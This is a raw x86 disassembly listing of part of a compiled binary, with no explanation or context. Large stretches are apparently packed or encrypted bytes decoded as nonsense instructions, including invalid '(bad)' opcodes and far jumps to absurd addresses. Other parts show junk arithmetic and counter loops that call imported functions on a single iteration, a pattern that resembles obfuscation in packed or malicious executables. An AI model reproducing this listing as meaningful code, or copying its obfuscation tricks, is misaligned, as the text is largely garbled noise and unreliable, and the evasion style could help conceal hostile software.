  4030c5:	pop    DWORD PTR [edi+esi*8-0x36]
  4030c9:	mov    ch,0x4c
  4030cb:	inc    edx
  4030cc:	(bad)  
  4030cd:	adc    ebp,DWORD PTR [ebp-0x79]
  4030d0:	xor    ecx,ebp
  4030d2:	fwait
  4030d3:	inc    edx
  4030d4:	aas    
  4030d5:	xor    DWORD PTR [edx-0x6485e5b9],eax
  4030db:	mov    DWORD PTR [ecx+0x438f4beb],ecx
  4030e1:	push   esp
  4030e2:	mov    edx,0x13f9582f
  4030e7:	ins    DWORD PTR es:[edi],dx
  4030e8:	cdq    
  4030e9:	jbe    0x403128
  4030eb:	add    cl,BYTE PTR [ebp-0x70]
  4030ee:	loope  0x403124
  4030f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030f1:	clc    
  4030f2:	inc    ecx
  4030f3:	pop    esi
  4030f4:	sbb    al,0x27
  4030f6:	mov    dh,0x40
  4030f8:	push   edx
  4030f9:	add    al,0x77
  4030fb:	mov    ecx,0xd78bc0ff
  403100:	cmp    al,0xea
  403102:	jle    0x4030bc
  403104:	stc    
  403105:	in     eax,dx
  403106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403107:	aad    0x4e
  403109:	adc    al,0xd5
  40310b:	pusha  
  40310c:	push   0x52
  40310e:	add    ecx,DWORD PTR [eax-0x1f]
  403111:	mov    dl,0xb2
  403113:	ror    BYTE PTR [ebp+0x65],1
  403116:	push   eax
  403117:	sbb    ah,bl
  403119:	je     0x40316a
  40311b:	aaa    
  40311c:	std    
  40311d:	jl     0x40313e
  40311f:	int    0x1
  403121:	xor    al,0xc
  403123:	mov    ah,0xe8
  403125:	mov    dl,BYTE PTR [edi+0x64]
  403128:	sbb    al,0xfc
  40312a:	sbb    ah,BYTE PTR [esi]
  40312c:	jne    0x4030ea
  40312e:	fsubr  st(4),st
  403130:	or     BYTE PTR [ebx-0x4f64312c],ah
  403136:	mov    WORD PTR [eax-0x63c4cbaf],cs
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx+0x4debc15c],0x91
  40315f:	sbb    DWORD PTR [edx-0x58181e9],edi
  403165:	jg     0x4031e5
  403167:	jle    0x40318d
  403169:	xchg   edx,eax
  40316a:	xchg   BYTE PTR [ecx+0x2a],ah
  40316d:	dec    esi
  40316e:	(bad)  
  40316f:	loopne 0x4030f2
  403171:	(bad)  
  403172:	fidivr WORD PTR [eax+0x30e27bab]
  403178:	add    al,0xd8
  40317a:	jno    0x403139
  40317c:	cld    
  40317d:	fwait
  40317e:	pop    ecx
  40317f:	jecxz  0x40314d
  403181:	and    eax,0x9b0fd78f
  403186:	fsub   DWORD PTR [edx+0x49404712]
  40318c:	push   ebx
  40318d:	shl    DWORD PTR [edi-0xa],0xba
  403191:	nop
  403192:	add    esp,ebx
  403194:	xchg   eax,esp
  403196:	std    
  403197:	hlt    
  403198:	dec    edi
  403199:	mov    ds:0xcffd3fcf,al
  40319e:	xchg   ecx,eax
  40319f:	stc    
  4031a0:	sbb    al,0x2c
  4031a2:	adc    BYTE PTR [ecx+0x69],dl
  4031a5:	addr16 (bad) 
  4031a7:	stc    
  4031a8:	test   BYTE PTR [edx+0x64f20f85],0xf0
  4031af:	rcl    DWORD PTR [edx-0x2],0xb
  4031b3:	dec    BYTE PTR [ebx-0x45]
  4031b6:	pop    ebp
  4031b7:	push   ebp
  4031b8:	add    al,0x75
  4031ba:	mov    bl,BYTE PTR [eax]
  4031bc:	in     al,0x8d
  4031be:	jl     0x4031d2
  4031c0:	add    BYTE PTR [esp+esi*2],bh
  4031c3:	push   ebx
  4031c4:	add    esi,DWORD PTR [edx-0x6be23035]
  4031ca:	pop    ebp
  4031cb:	cmc    
  4031cc:	rcl    BYTE PTR [ebx+0x174eadad],cl
  4031d2:	mov    bl,0x94
  4031d4:	add    DWORD PTR [edx],edx
  4031d6:	gs cwde 
  4031d8:	mov    eax,ds:0xaf9486b8
  4031dd:	cmc    
  4031de:	sahf   
  4031df:	fidivr WORD PTR [esi+0x2b9b44af]
  4031e5:	in     al,0xf4
  4031e7:	pop    eax
  4031e8:	std    
  4031e9:	and    edx,DWORD PTR [ecx+0x4f]
  4031ec:	lahf   
  4031ed:	fild   DWORD PTR [ebx+0x605ec84b]
  4031f3:	mov    eax,0x510a6442
  4031f8:	push   ebx
  4031f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031fa:	or     eax,0xe1b7dbda
  4031ff:	dec    ebp
  403200:	aaa    
  403201:	lods   al,BYTE PTR ds:[esi]
  403202:	in     al,dx
  403203:	pop    edi
  403204:	jne    0x403222
  403206:	jp     0x403283
  403208:	mov    eax,0x2d2d2f74
  40320d:	and    eax,0x67ace4aa
  403212:	jns    0x4031e5
  403214:	jae    0x4031c9
  403216:	mov    ah,bl
  403218:	inc    eax
  403219:	push   ecx
  40321a:	jae    0x4031d0
  40321c:	dec    ebx
  40321d:	or     DWORD PTR [ebx+0x47],ecx
  403220:	cmp    DWORD PTR [ecx],0xffffffdf
  403223:	sbb    esi,DWORD PTR [ecx-0x703a3f4d]
  403229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40322a:	add    DWORD PTR [edx-0x4d747ce9],ebx
  403230:	dec    eax
  403231:	stos   DWORD PTR es:[edi],eax
  403232:	or     DWORD PTR [eax+ecx*4],ecx
  403235:	cs xchg esi,eax
  403237:	lea    edx,[ecx-0x68]
  40323a:	(bad)  
  40323b:	cld    
  40323c:	pop    ds
  40323d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40323e:	bound  edi,QWORD PTR [ecx]
  403240:	arpl   WORD PTR [ecx+eax*4],di
  403243:	and    eax,0x9cc8ae2
  403248:	sbb    al,BYTE PTR [esi]
  40324a:	push   esp
  40324b:	fnstenv [esi-0x37c90853]
  403251:	imul   ebp,ebp,0x50
  403254:	and    dl,BYTE PTR [eax-0x882575]
  40325a:	or     dl,bl
  40325c:	ds pop esi
  40325e:	jbe    0x4032d4
  403260:	out    dx,eax
  403261:	mov    edi,0xf9bf9009
  403266:	stos   DWORD PTR es:[edi],eax
  403267:	(bad)  
  403268:	jp     0x403264
  40326a:	stc    
  40326b:	inc    esp
  40326c:	(bad)  
  40326d:	int    0xaa
  40326f:	hlt    
  403270:	imul   eax,esp,0x54b3ccf4
  403276:	test   eax,0x8921ed14
  40327b:	outs   dx,DWORD PTR ds:[esi]
  40327c:	setnp  BYTE PTR [ecx-0x1d8769b6]
  403283:	and    edi,DWORD PTR [edx-0x14]
  403286:	repz push esp
  403288:	dec    ecx
  403289:	inc    esp
  40328a:	jnp    0x4032c6
  40328c:	daa    
  40328d:	push   esp
  40328e:	enter  0x59ca,0x54
  403292:	mov    dl,0xa
  403294:	jp     0x403226
  403296:	pop    edx
  403297:	aas    
  403298:	ficomp DWORD PTR [ebp+0x6e50f680]
  40329e:	imul   DWORD PTR ds:0xe1df291a
  4032a4:	into   
  4032a5:	(bad)  
  4032a6:	mov    bl,0xcc
  4032a8:	inc    ecx
  4032a9:	sub    DWORD PTR [ecx+0x72099f63],0x33
  4032b0:	fst    DWORD PTR [ebx-0x707ed033]
  4032b6:	push   cs
  4032b7:	ss and eax,0x84844ae4
  4032bd:	ss jns 0x403247
  4032c0:	jo     0x40328d
  4032c2:	not    DWORD PTR [ebp-0x4f]
  4032c5:	cs test al,0xe
  4032c8:	lock int3 
  4032ca:	mov    ch,0x2e
  4032cc:	test   eax,0x73b59d34
  4032d1:	into   
  4032d2:	sbb    esi,ecx
  4032d4:	out    dx,al
  4032d5:	push   es
  4032d6:	mov    ds:0xdd343ff0,al
  4032db:	aas    
  4032dc:	aam    0x43
  4032de:	(bad)  
  4032df:	(bad)  [ebx+0x7850cd1]
  4032e5:	pop    esp
  4032e6:	(bad)  
  4032e7:	push   edx
  4032e8:	sub    edi,DWORD PTR [edi-0x74]
  4032eb:	retf   
  4032ec:	pop    esi
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x4336db,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x4336db
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x4336db,ecx
  40331d:	cmp    DWORD PTR ds:0x4336db,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x4336db,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x43376f,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x433757,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43369f
  40336b:	add    DWORD PTR ds:0x433683,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x4336d7,0x1e
  40338b:	cmp    DWORD PTR ds:0x4336d7,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x4336d7,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x4336d7,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x4336d7
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x4336d7,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x4336d7
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x4336d7,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x433767
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x4336c7
  4033f2:	mov    edi,DWORD PTR ds:0x433707
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x4336e7,0x1c
  40340f:	cmp    DWORD PTR ds:0x4336e7,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x4336e7,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x4336e7,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x4336e7
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x4336e7,edi
  40344c:	mov    edi,DWORD PTR ds:0x4336e7
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x4336e7,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x433763
  403467:	and    edx,DWORD PTR ds:0x433797
  40346d:	mov    DWORD PTR ds:0x433763,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43371b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43379f
  40349f:	adc    DWORD PTR ds:0x43367f,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433797,0x10
  4034c6:	cmp    DWORD PTR ds:0x433797,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433797,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433797,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433797
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433797,edi
  403505:	mov    edi,DWORD PTR ds:0x433797
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433797,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x4337ab,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp-0x252d2b76]
  403537:	(bad)  
  403538:	jnp    0x403500
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	inc    ebx
  403542:	xchg   BYTE PTR [eax],al
  403544:	add    al,0xfd
  403546:	enter  0x1d08,0x7a
  40354a:	sbb    ebx,esi
  40354c:	imul   ecx,DWORD PTR [esi],0xffffffe3
  40354f:	pusha  
  403550:	push   ecx
  403551:	lods   al,BYTE PTR ds:[esi]
  403552:	sti    
  403553:	or     eax,0xb3d7ee41
  403558:	data16 or al,0x44
  40355b:	bound  edi,QWORD PTR [edx+0x216b2e1]
  403561:	adc    DWORD PTR ds:0x9ea55dfd,ecx
  403567:	(bad)  
  403568:	hlt    
  403569:	sbb    esp,DWORD PTR [eax]
  40356b:	into   
  40356c:	push   ds
  40356d:	mov    eax,0xddcec62e
  403572:	jae    0x403555
  403574:	dec    edx
  403575:	push   ss
  403576:	jnp    0x40353d
  403578:	xchg   esp,eax
  403579:	pop    edx
  40357a:	arpl   di,ax
  40357c:	pop    esp
  40357d:	xchg   edi,eax
  40357e:	adc    DWORD PTR [esi],esp
  403580:	int    0xc7
  403582:	adc    ecx,DWORD PTR [ebp+0x264edfb5]
  403588:	dec    esi
  403589:	mov    ecx,0x43b0f3fc
  40358e:	ins    BYTE PTR es:[edi],dx
  40358f:	mov    esp,0xeca73c88
  403594:	cmp    DWORD PTR [edx],eax
  403596:	mov    ds:0x35ca32,eax
  40359b:	enter  0x7024,0x53
  40359f:	xchg   ebp,eax
  4035a0:	push   ebp
  4035a1:	lahf   
  4035a2:	mov    cl,BYTE PTR [ebx+0x28]
  4035a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035a6:	clc    
  4035a7:	mov    dh,0x6b
  4035a9:	shr    esp,cl
  4035ab:	xor    eax,0x583af100
  4035b0:	and    al,0xa0
  4035b2:	(bad)  
  4035b3:	loopne 0x403599
  4035b5:	sub    esp,DWORD PTR [ecx-0x5a]
  4035b8:	jl     0x4035a9
  4035ba:	test   al,0x2f
  4035bc:	ficom  DWORD PTR [edi]
  4035be:	and    DWORD PTR [eax],edx
  4035c0:	scas   eax,DWORD PTR es:[edi]
  4035c1:	pop    edx
  4035c2:	inc    edi
  4035c3:	xor    al,0x34
  4035c5:	inc    ebp
  4035c6:	xchg   DWORD PTR [edi+0x564c64f1],eax
  4035cc:	mov    eax,0xb119adcb
  4035d1:	inc    edx
  4035d2:	fwait
  4035d3:	or     eax,0x4456c3b5
  4035d8:	cmp    bl,BYTE PTR [esi+0xd2b1eca]
  4035de:	mov    esp,0xdf69b236
  4035e3:	sbb    al,BYTE PTR [esi+0x3c]
  4035e6:	pusha  
  4035e7:	sbb    DWORD PTR [edx-0x77],0xda01bd7
  4035ee:	sub    eax,0xb2a72035
  4035f3:	stos   DWORD PTR es:[edi],eax
  4035f4:	sub    cl,BYTE PTR [esi+0x1f]
  4035f7:	or     al,0x85
  4035f9:	cld    
  4035fa:	arpl   WORD PTR [ecx],bx
  4035fc:	hlt    
  4035fd:	test   al,0x1d
  4035ff:	sub    DWORD PTR [eax+ebx*2+0x3c854cbe],ebp
  403606:	adc    BYTE PTR [edi],0xd2
  403609:	dec    esi
  40360a:	je     0x8ee6249a
  403610:	add    esi,DWORD PTR [ebp+0x1a960a5c]
  403616:	jns    0x403606
  403618:	jge    0x4035b2
  40361a:	mov    WORD PTR [eax+0x788817bc],gs
  403620:	inc    DWORD PTR [edx]
  403622:	push   ds
  403623:	add    DWORD PTR [edi-0x43],ecx
  403626:	mov    esi,0xa8acaf25
  40362b:	push   ebp
  40362c:	or     al,0x72
  40362e:	jmp    0x9e17:0x3ed4d417
  403635:	adc    edi,edi
  403637:	mov    bh,0x30
  403639:	sbb    dl,BYTE PTR [edi]
  40363b:	es dec ebp
  40363d:	sbb    esi,edi
  40363f:	push   ebp
  403640:	inc    ecx
  403641:	push   ds
  403642:	call   0x7222:0x184247b0
  403649:	push   es
  40364a:	jecxz  0x40367c
  40364c:	shl    DWORD PTR [esi+0x7f974851],1
  403652:	push   edx
  403653:	xchg   esp,eax
  403654:	or     ch,BYTE PTR ds:0x74a70bca
  40365a:	jmp    0xc5f76ba8
  40365f:	out    dx,al
  403660:	or     DWORD PTR [ecx+0x8],0xffffff9a
  403664:	clc    
  403665:	shr    BYTE PTR [edi],0xed
  403668:	ret    0xf8b0
  40366b:	mov    WORD PTR ds:0x56249c11,gs
  403671:	outs   dx,BYTE PTR ds:[esi]
  403672:	(bad)
  403675:	int    0x77
  403677:	push   esi
  403678:	push   esp
  403679:	(bad)  
  40367a:	adc    BYTE PTR [ebx],bl
  40367c:	sbb    al,BYTE PTR [edx+0x5e]
  40367f:	jecxz  0x40369a
  403681:	ror    DWORD PTR [edx],cl
  403683:	xchg   ebp,eax
  403684:	nop
  403685:	(bad)  
  403686:	adc    dl,BYTE PTR [eax-0x41]
  403689:	sub    al,0xe9
  40368b:	fwait
  40368c:	lea    eax,[edi-0x3e]
  40368f:	pop    ds
  403690:	xchg   edx,eax
  403691:	xor    bl,BYTE PTR fs:[edi]
  403694:	loop   0x403642
  403696:	in     eax,dx
  403697:	push   ss
  403698:	adc    ebx,DWORD PTR [eax]
  40369a:	add    eax,esi
  40369c:	mov    BYTE PTR [eax],cl
  40369e:	xchg   ebp,eax
  40369f:	dec    esi
  4036a0:	push   0xffffffc2
  4036a2:	movlps xmm0,QWORD PTR [ebx+0x3e]
  4036a6:	adc    eax,0x6f1e2663
  4036ab:	ds pushf 
  4036ad:	dec    edi
  4036ae:	inc    BYTE PTR [edi]
  4036b0:	lods   al,BYTE PTR ds:[esi]
  4036b1:	sar    ecx,cl
  4036b3:	stos   DWORD PTR es:[edi],eax
  4036b4:	repz dec ebp
  4036b6:	mov    eax,0xdb496fb1
  4036bb:	mov    esi,0xe01ebc2f
  4036c0:	mov    esi,?
  4036c2:	dec    esp
  4036c3:	lahf   
  4036c4:	jl     0x4036b1
  4036c6:	repz icebp 
  4036c8:	add    al,0xc8
  4036ca:	or     DWORD PTR [esi+0x5a],0x4
  4036ce:	jmp    0x101d:0x5291bf6a
  4036d5:	add    ecx,DWORD PTR [ecx+0x6f334574]
  4036db:	jb     0x403739
  4036dd:	ret    
  4036de:	xchg   esp,eax
  4036df:	xor    BYTE PTR [ecx+edi*1+0x64f7d4b9],0x5a
  4036e7:	loopne 0x403754
  4036e9:	lods   eax,DWORD PTR ds:[esi]
  4036ea:	popf   
  4036eb:	jmp    0xc99024fb
  4036f0:	pop    ebx
  4036f1:	aas    
  4036f2:	sbb    bh,ah
  4036f4:	xor    ah,0x4f
  4036f7:	ret    
  4036f8:	sbb    edx,DWORD PTR [edx+eiz*4]
  4036fb:	je     0x403779
  4036fd:	dec    esi
  4036fe:	cmp    DWORD PTR [esi+0x7efd8696],edi
  403704:	push   cs
  403705:	popf   
  403706:	fadd   DWORD PTR [ebp-0x6050a8b5]
  40370c:	cwde   
  40370d:	xchg   esi,eax
  40370e:	push   esp
  40370f:	mov    dl,0xf6
  403711:	ja     0x4036a5
  403713:	cmp    ebp,DWORD PTR [esi]
  403715:	fcom   QWORD PTR [ebp+0x56]
  403718:	sub    eax,0x2b03bc2a
  40371d:	push   es
  40371e:	test   BYTE PTR [ecx],dh
  403720:	push   es
  403721:	and    BYTE PTR ds:0x7deb3c51,dl
  403727:	dec    ebx
  403728:	jno    0x403709
  40372a:	push   eax
  40372b:	mov    al,0x7d
  40372d:	adc    ah,BYTE PTR [edi-0x77ce8701]
  403733:	bound  esi,QWORD PTR [edi-0x7ae90941]
  403739:	jecxz  0x4036c5
  40373b:	and    BYTE PTR [edx-0x102aff2b],ah
  403741:	call   0x5bc7:0xd12c1e5f
  403748:	sti    
  403749:	add    eax,0xa1dd4eb4
  40374e:	xor    al,0x56
  403750:	out    dx,al
  403751:	js     0x4037ad
  403753:	pusha  
  403754:	cmp    DWORD PTR gs:[ebx+0x44],ecx
  403758:	or     eax,0xa5b119e5
  40375d:	repz mov gs,WORD PTR [ebx+ebp*4-0xa]
  403762:	push   edx
  403763:	stos   BYTE PTR es:[edi],al
  403764:	xchg   ecx,eax
  403765:	mov    bl,0x2a
  403767:	and    eax,0x29b84891
  40376c:	add    bl,BYTE PTR [esi]
  40376e:	dec    edx
  40376f:	cmc    
  403770:	ror    BYTE PTR [edi],1
  403772:	jmp    0x403749
  403774:	jp     0x4037e9
  403776:	sbb    al,0x8b
  403778:	pop    ebp
  403779:	inc    esi
  40377a:	int3   
  40377b:	dec    esp
  40377c:	clc    
  40377d:	xchg   ecx,eax
  40377e:	outs   dx,BYTE PTR ds:[esi]
  40377f:	jo     0x4037fe
  403781:	xchg   esi,eax
  403782:	push   ebp
  403783:	pusha  
  403784:	ja     0x40371d
  403786:	and    BYTE PTR [edi],0xc4
  403789:	pusha  
  40378a:	inc    esi
  40378b:	lock xchg ebx,eax
  40378d:	inc    eax
  40378e:	jno    0x4037a7
  403790:	sub    ecx,DWORD PTR [edx]
  403792:	mov    al,ds:0xbd935bea
  403797:	add    ecx,DWORD PTR [edx-0x52]
  40379a:	clc    
  40379b:	mov    ecx,0xe6e22f55
  4037a0:	pop    ecx
  4037a1:	mov    bh,0xd0
  4037a3:	cli    
  4037a4:	or     ah,BYTE PTR [esi+eiz*1+0x2c]
  4037a8:	dec    eax
  4037a9:	test   BYTE PTR [esi],cl
  4037ab:	inc    esi
  4037ac:	mov    eax,ds:0xfdac3451
  4037b1:	and    DWORD PTR [esi],ebp
  4037b3:	and    BYTE PTR [edi],cl
  4037b5:	fs nop
  4037b7:	dec    esp
  4037b8:	pop    ebp
  4037b9:	add    cl,dh
  4037bb:	pop    esp
  4037bc:	sbb    DWORD PTR [edi+0x17347ca6],esi
  4037c2:	cli    
  4037c3:	or     ebx,esp
  4037c5:	shl    BYTE PTR [ebx-0x6953d437],cl
  4037cb:	cmp    al,0xc4
  4037cd:	jl     0x403764
  4037cf:	jbe    0x4037f3
  4037d1:	mov    BYTE PTR [esi],bh
  4037d3:	(bad)  
  4037d4:	push   edi
  4037d5:	sub    al,0xa0
  4037d8:	jmp    0x8fb829dc
  4037dd:	lods   eax,DWORD PTR ds:[esi]
  4037de:	mov    al,ds:0xeb6a371d
  4037e3:	inc    esp
  4037e4:	xchg   ecx,eax
  4037e5:	push   ebx
  4037e6:	sbb    ecx,DWORD PTR [edx-0x3dd7f815]
  4037ec:	(bad)  
  4037ee:	mov    ds:0xa6e1e8aa,eax
  4037f3:	mov    bl,0x3d
  4037f5:	mov    edi,0xa1c5cc00
  4037fa:	push   ecx
  4037fb:	sbb    BYTE PTR [esi-0x26],ch
  4037fe:	jle    0x403874
  403800:	mov    edx,0x1237880c
  403805:	(bad)  
  403806:	sahf   
  403807:	xchg   ebx,eax
  403808:	adc    eax,0x23de5d98
  40380d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40380e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40380f:	gs pushf 
  403811:	ins    DWORD PTR es:[edi],dx
  403812:	inc    ebx
  403813:	test   BYTE PTR [eax+0x6c],cl
  403816:	xor    al,0xb
  403818:	out    0x93,eax
  40381a:	retf   0x21ea
  40381d:	es pop ds
  40381f:	lea    edi,[eax]
  403821:	xchg   ecx,eax
  403822:	mov    bh,cl
  403824:	out    dx,al
  403825:	cwde   
  403826:	in     eax,0xc7
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x367b3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	sub    esi,DWORD PTR [edi]
  40383b:	inc    ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x4337a725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x4337a7
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x4337a7,edi
  403858:	cmp    DWORD PTR ds:0x4337a7,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x4337a7,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x4337a7
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x4337a7,edi
  40389c:	cmp    DWORD PTR ds:0x4337a7,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x4336eb,0x4337ab
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433713,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x43376b,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x4337a7,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x43376b,0x43372b
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x43367b,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433697,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433693,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43379b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x43367f,0x1d
  403935:	cmp    DWORD PTR ds:0x43367f,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x43367f,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x43367f,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x43367f
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x43367f,ebx
  403985:	mov    ebx,DWORD PTR ds:0x43367f
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x43367f,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x4336e7
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433693
  4039a6:	sub    edi,DWORD PTR ds:0x4337a3
  4039ac:	mov    DWORD PTR ds:0x433693,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433687,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433687,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433687,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433687
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433687,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433697
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x43367b,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x43367b
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x43367b,ebx
  403a19:	cmp    DWORD PTR ds:0x43367b,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
